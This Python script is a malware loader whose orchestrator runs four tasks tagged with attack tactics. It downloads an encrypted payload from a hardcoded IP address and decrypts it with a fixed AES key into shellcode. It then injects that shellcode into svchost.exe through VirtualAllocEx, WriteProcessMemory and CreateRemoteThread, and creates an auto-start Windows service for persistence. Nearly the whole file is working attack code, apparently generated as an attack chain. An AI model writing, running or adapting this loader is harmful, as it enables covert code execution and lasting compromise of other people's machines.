#!/usr/bin/env python3
import sys
import json
import time
import requests
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import ctypes
import subprocess

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        url = "https://192.168.117.139/api"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        encrypted_payload_hex = response.content.hex()
        result = {
            'data': encrypted_payload_hex,
            'url': url
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        aes_key = b'This is a key123'
        aes_iv = b'This is an IV456'
        encrypted_data = bytes.fromhex(input_data.get('data', ''))
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        result = {'shellcode': decrypted_data.hex()}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {'shellcode': None}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shellcode = bytes.fromhex(input_data.get('shellcode', ''))
        process_name = "svchost.exe"
        result = subprocess.run(
            ["tasklist", "/FI", f"IMAGENAME eq {process_name}", "/FO", "CSV"],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.splitlines()
        if len(lines) < 2:
            raise Exception("svchost.exe not found")
        pid = int(lines[1].split(",")[1].strip('"'))
        PROCESS_ALL_ACCESS = 0x1F0FFF
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            raise Exception("Failed to open process")
        shellcode_size = len(shellcode)
        MEM_COMMIT = 0x1000
        PAGE_EXECUTE_READWRITE = 0x40
        remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
            process_handle, 0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE
        )
        if not remote_memory:
            raise Exception("Failed to allocate memory in target process")
        bytes_written = ctypes.c_size_t(0)
        if not ctypes.windll.kernel32.WriteProcessMemory(
            process_handle, remote_memory, shellcode, shellcode_size, ctypes.byref(bytes_written)
        ):
            raise Exception("Failed to write shellcode to process memory")
        thread_id = ctypes.c_ulong(0)
        if not ctypes.windll.kernel32.CreateRemoteThread(
            process_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id)
        ):
            raise Exception("Failed to create remote thread")
        ctypes.windll.kernel32.CloseHandle(process_handle)
        return {'success': True, 'data': {'success': True},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'success': False}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    service_name = "MyPersistentService"
    try:
        command = [
            "sc", "create", service_name,
            "binPath=", "C:\\Path\\To\\YourExecutable.exe",
            "start=", "auto"
        ]
        subprocess.run(command, check=True, timeout=10)
        result = {
            "service_name": service_name,
            "success": True
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {
            "service_name": service_name,
            "success": False
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Download Payload [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Download Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Download Payload): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decrypt Payload [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decrypt Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decrypt Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Inject Shellcode [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Inject Shellcode): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))